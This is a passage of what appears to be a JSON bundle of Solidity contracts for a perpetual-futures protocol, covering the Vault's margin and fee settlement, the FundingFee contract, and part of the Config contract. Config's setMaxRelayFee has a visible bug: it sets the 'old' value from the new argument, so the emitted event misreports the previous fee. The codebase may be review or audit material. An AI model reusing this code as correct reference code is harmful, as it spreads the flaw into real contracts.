_getBorrowingFee();\n        bool hasBorrowingFee = address(borrowingFee) != address(0);\n        if (hasBorrowingFee) {\n            (int256 takerBorrowingFee, int256 makerBorrowingFee) = borrowingFee.beforeSettlePosition(\n                params.marketId,\n                params.taker,\n                params.maker,\n                params.takerPositionSize,\n                params.takerOpenNotional\n            );\n            takerPendingMargin -= takerBorrowingFee;\n            makerPendingMargin -= makerBorrowingFee;\n        }\n        IFundingFee fundingFee = _getFundingFee();\n        if (address(fundingFee) != address(0)) {\n            (int256 takerFundingFee, int256 makerFundingFee) = fundingFee.beforeSettlePosition(\n                params.marketId,\n                params.taker,\n                params.maker\n            );\n            takerPendingMargin -= takerFundingFee;\n            makerPendingMargin -= makerFundingFee;\n        }\n        // settle taker & maker's pending margin\n        if (takerPendingMargin != 0) {\n            _settlePnl(params.marketId, params.taker, takerPendingMargin);\n        }\n        if (makerPendingMargin != 0) {\n            _settlePnl(params.marketId, params.maker, makerPendingMargin);\n        }\n\n        // settle maker first, let taker can settle unsettledPnl as much as possible\n        _addPosition(\n            // Note: for maker, the reason for PositionChanged is always `Trade` because he is the counter-party\n            AddPositionParams({\n                marketId: params.marketId,\n                trader: params.maker,\n                maker: params.maker,\n                positionSizeDelta: -params.takerPositionSize,\n                openNotionalDelta: -params.takerOpenNotional,\n                reason: PositionChangedReason.Trade\n            })\n        );\n        _addPosition(\n            AddPositionParams({\n                marketId: params.marketId,\n                trader: params.taker,\n                maker: params.maker,\n                positionSizeDelta: params.takerPositionSize,\n                openNotionalDelta: params.takerOpenNotional,\n                reason: params.reason\n            })\n        );\n\n        // after hook\n        if (hasBorrowingFee) {\n            borrowingFee.afterSettlePosition(params.marketId, params.maker);\n        }\n    }\n\n    /// @inheritdoc IVault\n    function transferFund(address from, address to, uint256 amountXCD) external onlyClearingHouse {\n        _updateFund(from, -amountXCD.toInt256());\n        _updateFund(to, amountXCD.toInt256());\n    }\n\n    /// @inheritdoc IVault\n    function transferMargin(\n        uint256 marketId,\n        address from,\n        address to,\n        uint256 amount\n    ) external marketExistsAndActive(marketId) onlyClearingHouse {\n        _settlePnl(marketId, from, -(amount.toInt256()));\n        _settlePnl(marketId, to, amount.toInt256());\n    }\n\n    //\n    // PUBLIC\n    //\n\n    /// @dev in the beginning it only open for orderGateway & orderGatewayV2 to be authorized\n    /// @inheritdoc AuthorizationUpgradeable\n    function setAuthorization(address authorized, bool isAuthorized_) public override {\n        if (\n            isAuthorized_ &&\n            authorized != address(getAddressManager().getOrderGateway()) &&\n            authorized != address(getAddressManager().getOrderGatewayV2())\n        ) {\n            revert LibError.NotWhitelistedAuthorization();\n        }\n        super.setAuthorization(authorized, isAuthorized_);\n    }\n\n    //\n    // EXTERNAL VIEW\n    //\n\n    function getUnsettledPnl(uint256 marketId, address trader) external view returns (int256) {\n        return _getUnsettledPnl(marketId, trader);\n    }\n\n    function getFund(address trader) external view returns (uint256) {\n        return _getFund(trader);\n    }\n\n    function getSettledMargin(uint256 marketId, address trader) external view returns (int256) {\n        return _getSettledMargin(marketId, trader);\n    }\n\n    function getCollateralToken() external view returns (address) {\n        return _getVaultStorage().collateralToken;\n    }\n\n    //\n    // PUBLIC VIEW\n    //\n\n    /// @inheritdoc MarginProfile\n    /// @dev margin = settledMargin + unsettledPnl\n    function getMargin(\n        uint256 marketId,\n        address trader\n    ) public view override(IMarginProfile, MarginProfile) returns (int256) {\n        return _getSettledMargin(marketId, trader) + getPendingMargin(marketId, trader);\n    }\n\n    /// @inheritdoc MarginProfile\n    /// @dev free margin = max(margin state + pending margin + settleable unsettled pnl, 0)\n    function getFreeMargin(\n        uint256 marketId,\n        address trader\n    ) public view override(IMarginProfile, MarginProfile) returns (uint256) {\n        int256 pendingMargin = getPendingMargin(marketId, trader);\n        return _getFreeMargin(marketId, trader, pendingMargin);\n    }\n\n    /// @inheritdoc MarginProfile\n    function getPositionSize(\n        uint256 marketId,\n        address trader\n    ) public view override(IMarginProfile, MarginProfile) returns (int256) {\n        return _getPositionSize(marketId, trader);\n    }\n\n    /// @inheritdoc MarginProfile\n    function getOpenNotional(\n        uint256 marketId,\n        address trader\n    ) public view override(IMarginProfile, MarginProfile) returns (int256) {\n        return _getOpenNotional(marketId, trader);\n    }\n\n    /// @dev returning marginDelta, but fee is negative, reverse the sign\n    function getPendingMargin(uint256 marketId, address trader) public view returns (int256) {\n        int256 pendingMargin;\n        IBorrowingFee borrowingFee = _getBorrowingFee();\n        if (address(borrowingFee) != address(0)) {\n            pendingMargin -= borrowingFee.getPendingFee(marketId, trader);\n        }\n        IFundingFee fundingFee = _getFundingFee();\n        if (address(fundingFee) != address(0)) {\n            pendingMargin -= fundingFee.getPendingFee(marketId, trader);\n        }\n        return pendingMargin;\n    }\n\n    function getPnlPoolBalance(uint256 marketId) public view returns (uint256) {\n        return _getPnlPoolBalance(marketId);\n    }\n\n    function getBadDebt(uint256 marketId) public view returns (uint256) {\n        return _getBadDebt(marketId);\n    }\n\n    //\n    // INTERNAL\n    //\n\n    function _transferCollateralIn(address sender, address recipient, uint256 amountXCD) internal {\n        IERC20Metadata collateralToken = IERC20Metadata(_getVaultStorage().collateralToken);\n        uint256 balanceBefore = collateralToken.balanceOf(recipient);\n        collateralToken.safeTransferFrom(sender, recipient, amountXCD);\n        uint256 transferredAmountXCD = collateralToken.balanceOf(recipient) - balanceBefore;\n        if (transferredAmountXCD != amountXCD) {\n            revert LibError.MismatchedTransferAmount(transferredAmountXCD, amountXCD);\n        }\n\n        ICircuitBreaker circuitBreaker = _getCircuitBreaker();\n\n        if (address(circuitBreaker) != address(0)) {\n            // update CircuitBreaker rate limit status\n            circuitBreaker.onTokenInflow(address(collateralToken), amountXCD);\n        }\n    }\n\n    function _transferCollateralOut(address recipient, uint256 amountXCD, bool revertOnRateLimit) internal {\n        ICircuitBreaker circuitBreaker = _getCircuitBreaker();\n        address collateralToken = _getVaultStorage().collateralToken;\n\n        if (address(circuitBreaker) != address(0)) {\n            IERC20Metadata(collateralToken).safeTransfer(address(circuitBreaker), amountXCD);\n\n            // update/check CircuitBreaker rate limit status\n            circuitBreaker.onTokenOutflow(collateralToken, amountXCD, recipient, revertOnRateLimit);\n        } else {\n            IERC20Metadata(collateralToken).safeTransfer(recipient, amountXCD);\n        }\n    }\n\n    /// @param marginDeltaXCD in collateral's decimals, trader's perspective\n    function _formatAndUpdateMargin(uint256 marketId, address trader, int256 marginDeltaXCD) internal {\n        // before hook\n        int256 pendingMargin;\n        IBorrowingFee borrowingFee = _getBorrowingFee();\n        bool hasBorrowingFee = address(borrowingFee) != address(0);\n        if (hasBorrowingFee) {\n            int256 pendingBorrowingFee = borrowingFee.beforeUpdateMargin(marketId, trader);\n            pendingMargin -= pendingBorrowingFee;\n        }\n        IFundingFee fundingFee = _getFundingFee();\n        if (address(fundingFee) != address(0)) {\n            int256 pendingFundingFee = fundingFee.beforeUpdateMargin(marketId, trader);\n            pendingMargin -= pendingFundingFee;\n        }\n        if (pendingMargin != 0) {\n            _settlePnl(marketId, trader, pendingMargin);\n        }\n\n        // update margin\n        uint8 collateralDecimals = IERC20Metadata(_getVaultStorage().collateralToken).decimals();\n        int256 marginDelta = marginDeltaXCD.formatDecimals(collateralDecimals, INTERNAL_DECIMALS);\n        _updateMargin(marketId, trader, marginDelta);\n\n        // after hook\n        if (hasBorrowingFee) {\n            borrowingFee.afterUpdateMargin(marketId, trader);\n        }\n    }\n\n    /// @param amountXCD in collateral's decimals\n    function _transferFundToMargin(\n        uint256 marketId,\n        address trader,\n        uint256 amountXCD\n    ) internal marketExistsAndActive(marketId) {\n        if (amountXCD == 0) {\n            revert LibError.ZeroAmount();\n        }\n\n        _updateFund(trader, -amountXCD.toInt256());\n\n        // update accounting\n        _formatAndUpdateMargin(marketId, trader, amountXCD.toInt256());\n\n        // repay from margin right away if there's any unsettled loss before\n        _settlePnl(marketId, trader, 0);\n    }\n\n    function _transferMarginToFund(\n        uint256 marketId,\n        address trader,\n        uint256 amountXCD\n    ) internal marketExistsAndActive(marketId) {\n        if (amountXCD == 0) {\n            revert LibError.ZeroAmount();\n        }\n\n        // check free collateral is enough for withdraw\n        uint256 price = _getPrice(marketId);\n        uint256 freeCollateral = getFreeCollateral(marketId, trader, price);\n\n        //  convert margin from collateral decimals to INTERNAL_DECIMALS for comparison\n        IERC20Metadata collateralToken = IERC20Metadata(_getVaultStorage().collateralToken);\n        uint256 amount = amountXCD.formatDecimals(collateralToken.decimals(), INTERNAL_DECIMALS);\n        if (freeCollateral < amount) {\n            revert LibError.NotEnoughFreeCollateral(marketId, trader);\n        }\n\n        // repay from margin first if there's any unsettled loss before\n        _settlePnl(marketId, trader, 0);\n\n        // update accounting\n        _formatAndUpdateMargin(marketId, trader, -amountXCD.toInt256());\n\n        _updateFund(trader, amountXCD.toInt256());\n    }\n\n    //\n    // INTERNAL VIEW\n    //\n\n    /// @inheritdoc MarginProfile\n    function _getInitialMarginRatio(uint256 marketId) internal view override returns (uint256) {\n        return _getConfig().getInitialMarginRatio(marketId);\n    }\n\n    /// @inheritdoc MarginProfile\n    function _getMaintenanceMarginRatio(uint256 marketId) internal view override returns (uint256) {\n        return _getConfig().getMaintenanceMarginRatio(marketId);\n    }\n\n    function _getConfig() internal view returns (Config) {\n        return getAddressManager().getConfig();\n    }\n\n    function _getBorrowingFee() internal view returns (IBorrowingFee) {\n        return getAddressManager().getBorrowingFee();\n    }\n\n    function _getFundingFee() internal view returns (IFundingFee) {\n        return getAddressManager().getFundingFee();\n    }\n\n    function _getSystemStatus() internal view returns (ISystemStatus) {\n        return getAddressManager().getSystemStatus();\n    }\n\n    function _getCircuitBreaker() internal view returns (ICircuitBreaker) {\n        return getAddressManager().getCircuitBreaker();\n    }\n\n    function _checkIsSenderAuthorized(address onBehalf) internal view {\n        if (!isAuthorized(onBehalf, msg.sender)) revert LibError.AuthorizerNotAllow(onBehalf, msg.sender);\n    }\n\n    function _getPrice(uint256 marketId) internal view returns (uint256) {\n        (uint256 price, ) = getAddressManager().getPythOracleAdapter().getPrice(\n            getAddressManager().getConfig().getPriceFeedId(marketId)\n        );\n        return price;\n    }\n\n    function _checkDepositCap() internal view {\n        uint256 depositCap = _getConfig().getDepositCap();\n        if (IERC20Metadata(_getVaultStorage().collateralToken).balanceOf(address(this)) > depositCap) {\n            revert LibError.DepositCapExceeded();\n        }\n    }\n\n    //\n    // PRIVATE\n    //\n\n    function _getVaultStorage() private pure returns (VaultStorage storage $) {\n        assembly {\n            $.slot := _VAULT_STORAGE_LOCATION\n        }\n    }\n}"
    },
    {
      "filename": "perp-contract-v3/src/fundingFee/FundingFee.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport { SafeCast } from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport { FixedPointMathLib } from \"solady/src/utils/FixedPointMathLib.sol\";\nimport { IAddressManager } from \"../addressManager/IAddressManager.sol\";\nimport { AddressResolverUpgradeable } from \"../addressResolver/AddressResolverUpgradeable.sol\";\nimport { LibAddressResolver } from \"../addressResolver/LibAddressResolver.sol\";\nimport { LibError } from \"../common/LibError.sol\";\nimport { WAD } from \"../common/LibConstant.sol\";\nimport { FundingConfig } from \"../config/FundingConfig.sol\";\nimport { OracleMaker } from \"../maker/OracleMaker.sol\";\nimport { IVault } from \"../vault/IVault.sol\";\nimport { Config } from \"../config/Config.sol\";\nimport { IFundingFee } from \"./IFundingFee.sol\";\n\ncontract FundingFee is AddressResolverUpgradeable, IFundingFee {\n    using SafeCast for *;\n    using FixedPointMathLib for int256;\n    using LibAddressResolver for IAddressManager;\n\n    //\n    // STRUCT\n    //\n\n    /// @custom:storage-location erc7201:perp.storage.fundingFee\n    struct FundingFeeStorage {\n        // key: marketId, value: fundingGrowthLongIndex\n        mapping(uint256 => int256) fundingGrowthLongIndexMap;\n        // key: marketId, value: lastUpdatedTimestamp\n        mapping(uint256 => uint256) lastUpdatedTimestampMap;\n        mapping(uint256 => mapping(address => int256)) lastFundingGrowthLongIndexMap;\n    }\n\n    event FundingFeeSettled(uint256 marketId, address trader, int256 fundingFee);\n\n    //\n    // STATE\n    //\n\n    // keccak256(abi.encode(uint256(keccak256(\"perp.storage.fundingFee\")) - 1)) & ~bytes32(uint256(0xff));\n    bytes32 constant _FUNDING_FEE_STORAGE_LOCATION = 0x67af2bbd5c68531270a033011670248db9cc70016659ba644098886bbb018000;\n\n    //\n    // MODIFIER\n    //\n    modifier onlyVault() {\n        if (msg.sender != address(_getVault())) revert LibError.Unauthorized();\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address addressManager) external initializer {\n        __AddressResolver_init(addressManager);\n    }\n\n    //\n    // EXTERNAL\n    //\n\n    /// @inheritdoc IFundingFee\n    function beforeUpdateMargin(uint256 marketId, address trader) external onlyVault returns (int256) {\n        _updateFundingGrowthIndex(marketId);\n        int256 fundingFee = _settleFundingFee(marketId, trader);\n        return fundingFee;\n    }\n\n    /// @inheritdoc IFundingFee\n    function beforeSettlePosition(\n        uint256 marketId,\n        address taker,\n        address maker\n    ) external onlyVault returns (int256, int256) {\n        _updateFundingGrowthIndex(marketId);\n        int256 takerFundingFee = _settleFundingFee(marketId, taker);\n        int256 makerFundingFee = _settleFundingFee(marketId, maker);\n        return (takerFundingFee, makerFundingFee);\n    }\n\n    //\n    // PUBLIC VIEW\n    //\n\n    /// @inheritdoc IFundingFee\n    function getPendingFee(uint256 marketId, address trader) public view returns (int256) {\n        int256 fundingRate = getCurrentFundingRate(marketId);\n        int256 fundingGrowthLongIndex = _getFundingFeeStorage().fundingGrowthLongIndexMap[marketId] +\n            (fundingRate * int256(block.timestamp - _getFundingFeeStorage().lastUpdatedTimestampMap[marketId]));\n        int256 openNotional = _getVault().getOpenNotional(marketId, trader);\n        int256 fundingFee = 0;\n        if (openNotional != 0) {\n            fundingFee = _calcFundingFee(\n                openNotional,\n                fundingGrowthLongIndex - _getFundingFeeStorage().lastFundingGrowthLongIndexMap[marketId][trader]\n            );\n        }\n        return fundingFee;\n    }\n\n    function getCurrentFundingRate(uint256 marketId) public view returns (int256) {\n        Config config = getAddressManager().getConfig();\n        FundingConfig memory fundingConfig = config.getFundingConfig(marketId);\n\n        if (fundingConfig.basePool == address(0)) {\n            return 0;\n        }\n\n        int256 openNotional = _getVault().getOpenNotional(marketId, fundingConfig.basePool);\n        if (openNotional == 0) {\n            return 0;\n        }\n\n        uint256 openNotionalAbs = openNotional.abs();\n        bool isBasePoolLong = openNotional < 0;\n\n        // we can only use margin without pendingMargin as totalDepositedAmount\n        // since pendingMargin includes pending borrowingFee and fundingFee,\n        // it will be infinite loop dependency\n        uint256 totalDepositedAmount = uint256(_getVault().getSettledMargin(marketId, fundingConfig.basePool));\n        uint256 maxCapacity = FixedPointMathLib.divWad(\n            totalDepositedAmount,\n            uint256(OracleMaker(fundingConfig.basePool).minMarginRatio())\n        );\n\n        // maxCapacity = basePool.totalDepositedAmount / basePool.minMarginRatio\n        // imbalanceRatio = basePool.openNotional^fundingExponentFactor / maxCapacity\n        // fundingRate = fundingFactor * imbalanceRatio\n        // funding = trader.openNotional * fundingRate * deltaTimeInSeconds\n        uint256 fundingRateAbs = FixedPointMathLib.fullMulDiv(\n            fundingConfig.fundingFactor,\n            FixedPointMathLib\n                .powWad(openNotionalAbs.toInt256(), fundingConfig.fundingExponentFactor.toInt256())\n                .toUint256(),\n            maxCapacity\n        );\n\n        // positive -> basePool is long -> receive funding for long position, pay funding for short position\n        // negative -> basePool is short -> receive funding for short position, pay funding for long position,\n        int256 fundingRate = isBasePoolLong ? int256(fundingRateAbs) : -int256(fundingRateAbs);\n        return fundingRate;\n    }\n\n    //\n    // INTERNAL\n    //\n\n    function _updateFundingGrowthIndex(uint256 marketId) internal {\n        int256 fundingRate = getCurrentFundingRate(marketId);\n        // index increase -> receive funding\n        // index reduce   -> pay funding\n        _getFundingFeeStorage().fundingGrowthLongIndexMap[marketId] +=\n            fundingRate *\n            int256(block.timestamp - _getFundingFeeStorage().lastUpdatedTimestampMap[marketId]);\n        _getFundingFeeStorage().lastUpdatedTimestampMap[marketId] = block.timestamp;\n    }\n\n    /// @dev caller must ensure _updateFundingGrowthIndex() is called before calling this function\n    function _settleFundingFee(uint256 marketId, address trader) internal returns (int256) {\n        int256 fundingGrowthLongIndex = _getFundingFeeStorage().fundingGrowthLongIndexMap[marketId];\n        int256 openNotional = _getVault().getOpenNotional(marketId, trader);\n        int256 fundingFee = 0;\n        if (openNotional != 0) {\n            fundingFee = _calcFundingFee(\n                openNotional,\n                fundingGrowthLongIndex - _getFundingFeeStorage().lastFundingGrowthLongIndexMap[marketId][trader]\n            );\n        }\n        _getFundingFeeStorage().lastFundingGrowthLongIndexMap[marketId][trader] = _getFundingFeeStorage()\n            .fundingGrowthLongIndexMap[marketId];\n\n        emit FundingFeeSettled(marketId, trader, fundingFee);\n        return fundingFee;\n    }\n\n    //\n    // INTERNAL VIEW\n    //\n\n    /// @notice positive -> pay funding fee -> fundingFee should round up\n    /// negative -> receive funding fee -> -fundingFee should round down\n    function _calcFundingFee(int256 openNotional, int256 deltaGrowthIndex) internal pure returns (int256) {\n        if (openNotional * deltaGrowthIndex > 0) {\n            return int256(FixedPointMathLib.fullMulDivUp(openNotional.abs(), deltaGrowthIndex.abs(), WAD));\n        } else {\n            return (openNotional * deltaGrowthIndex) / WAD.toInt256();\n        }\n    }\n\n    function _getVault() internal view returns (IVault) {\n        return getAddressManager().getVault();\n    }\n\n    function _getFundingFeeStorage() private pure returns (FundingFeeStorage storage $) {\n        assembly {\n            $.slot := _FUNDING_FEE_STORAGE_LOCATION\n        }\n    }\n}"
    },
    {
      "filename": "perp-contract-v3/src/config/Config.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\n// solhint-disable-next-line max-line-length\nimport { Ownable2StepUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\nimport { IAddressManager } from \"../addressManager/IAddressManager.sol\";\nimport { AddressResolverUpgradeable } from \"../addressResolver/AddressResolverUpgradeable.sol\";\nimport { LibAddressResolver } from \"../addressResolver/LibAddressResolver.sol\";\nimport { WAD } from \"../common/LibConstant.sol\";\nimport { IPythOracleAdapter } from \"../oracle/pythOracleAdapter/IPythOracleAdapter.sol\";\nimport { IBorrowingFee } from \"../borrowingFee/IBorrowingFee.sol\";\nimport { FundingConfig } from \"./FundingConfig.sol\";\nimport { LibError } from \"../common/LibError.sol\";\n\ncontract Config is Ownable2StepUpgradeable, AddressResolverUpgradeable {\n    using LibAddressResolver for IAddressManager;\n\n    //\n    // STRUCT\n    //\n\n    /// @custom:storage-location erc7201:perp.storage.config\n    struct ConfigStorage {\n        uint256 maxRelayFee;\n        uint256 maxOrderValidDuration;\n        uint256 orderDelaySeconds;\n        // risk params\n        // key: marketId\n        mapping(uint256 => uint256) initialMarginRatioMap;\n        mapping(uint256 => uint256) maintenanceMarginRatioMap;\n        mapping(uint256 => uint256) liquidationFeeRatioMap;\n        mapping(uint256 => uint256) liquidationPenaltyRatioMap;\n        // key: marketId, value: priceFeedId\n        mapping(uint256 => bytes32) marketMap;\n        // key: marketId, key: trader\n        mapping(uint256 => mapping(address => bool)) whitelistedMakerMap;\n        // funding fee related\n        // key: marketId, value: fundingConfig\n        mapping(uint256 => FundingConfig) fundingConfigMap;\n        // key: marketId\n        mapping(uint256 => uint256) priceBandRatioMap;\n        uint256 depositCap;\n    }\n\n    //\n    // STATE\n    //\n\n    // keccak256(abi.encode(uint256(keccak256(\"perp.storage.config\")) - 1)) & ~bytes32(uint256(0xff));\n    bytes32 constant _CONFIG_STORAGE_LOCATION = 0xd52a28ad368ece7953b1a7017c59e62cbf8c1a4757f2dea382bd993edab66400;\n\n    //\n    // EVENT\n    //\n\n    event OrderDelaySecondsSet(uint256 newOrderDelaySeconds, uint256 oldOrderDelaySeconds);\n    event MaxRelayFeeSet(uint256 indexed newMaxRelayFee, uint256 indexed oldMaxRelayFee);\n    event MaxOrderValidDurationSet(uint256 newMaxOrderValidDuration, uint256 oldMaxOrderValidDuration);\n\n    event InitialMarginRatioSet(uint256 marketId, uint256 newRatio, uint256 oldRatio);\n    event MaintenanceMarginRatioSet(uint256 marketId, uint256 newRatio, uint256 oldRatio);\n    event LiquidationFeeRatioSet(uint256 marketId, uint256 newRatio, uint256 oldRatio);\n    event LiquidationPenaltyRatioSet(uint256 marketId, uint256 newRatio, uint256 oldRatio);\n\n    event MarketCreated(uint256 marketId, bytes32 priceFeedId);\n    event MakerRegistered(uint256 marketId, address maker);\n    event FundingConfigSet(\n        uint256 marketId,\n        uint256 fundingFactor,\n        uint256 fundingExponentFactor,\n        address basePool,\n        uint256 oldFundingFactor,\n        uint256 oldFundingExponentFactor,\n        address oldBasePool\n    );\n    event DepositCapSet(uint256 newDepositCap, uint256 oldDepositCap);\n    event PriceBandRatioMapSet(uint256 marketId, uint256 newPriceBandRatio, uint256 oldPriceBandRatio);\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address addressManager) public initializer {\n        __AddressResolver_init(addressManager);\n        __Ownable2Step_init();\n        __Ownable_init(msg.sender);\n    }\n\n    //\n    // EXTERNAL NON VIEW\n    //\n    function setOrderDelaySeconds(uint256 orderDelaySecondsArg) public onlyOwner {\n        uint256 oldOrderDelaySeconds = _getConfigStorage().orderDelaySeconds;\n        _getConfigStorage().orderDelaySeconds = orderDelaySecondsArg;\n\n        emit OrderDelaySecondsSet(orderDelaySecondsArg, oldOrderDelaySeconds);\n    }\n\n    function setMaxRelayFee(uint256 maxRelayFee) external onlyOwner {\n        uint256 oldMaxRelayFee = maxRelayFee;\n        _getConfigStorage().maxRelayFee = oldMaxRelayFee;\n        emit MaxRelayFeeSet(maxRelayFee, oldMaxRelayFee);\n    }\n\n    function setMaxOrderValidDuration(uint256 maxOrderValidDuration) external onlyOwner {\n        uint256 oldMaxOrderValidDuration = _getConfigStorage().maxOrderValidDuration;\n        _getConfigStorage().maxOrderValidDuration = maxOrderValidDuration;\n        emit MaxOrderValidDurationSet(maxOrderValidDuration, oldMaxOrderValidDuration);\n    }\n\n    function setInitialMarginRatio(uint256 marketId, uint256 ratio) external onlyOwner {\n        _checkValidRatio(ratio);\n        if (ratio == 0) revert LibError.ZeroRatio();\n\n        uint256 oldRatio = _getConfigStorage().initialMarginRatioMap[marketId];\n        _getConfigStorage().initialMarginRatioMap[marketId] = ratio;\n        emit InitialMarginRatioSet(marketId, ratio, oldRatio);\n    }\n\n    function setMaintenanceMarginRatio(uint256 marketId, uint256 ratio) external onlyOwner {\n        _checkValidRatio(ratio);\n        if (ratio == 0) revert LibError.ZeroRatio();\n\n        uint256 oldRatio = _getConfigStorage().maintenanceMarginRatioMap[marketId];\n        _getConfigStorage().maintenanceMarginRatioMap[marketId] = ratio;\n        emit MaintenanceMarginRatioSet(marketId, ratio, oldRatio);\n    }\n\n    function setLiquidationFeeRatio(uint256 marketId, uint256 ratio) external onlyOwner {\n        _checkValidRatio(ratio);\n        uint256 oldRatio = _getConfigStorage().liquidationFeeRatioMap[marketId];\n        _getConfigStorage().liquidationFeeRatioMap[marketId] = ratio;\n        emit LiquidationFeeRatioSet(marketId, ratio, oldRatio);\n    }\n\n    function setLiquidationPenaltyRatio(uint256 marketId, uint256 ratio) external onlyOwner {\n        _checkValidRatio(ratio);\n        uint256 oldRatio = _getConfigStorage().liquidationPenaltyRatioMap[marketId];\n        _getConfigStorage().liquidationPenaltyRatioMap[marketId] = ratio;\n        emit LiquidationPenaltyRatioSet(marketId, ratio, oldRatio);\n    }\n\n    function setMaxBorrowingFeeRate(\n        uint256 marketId,\n        uint256 maxLon"
    }
  ]
}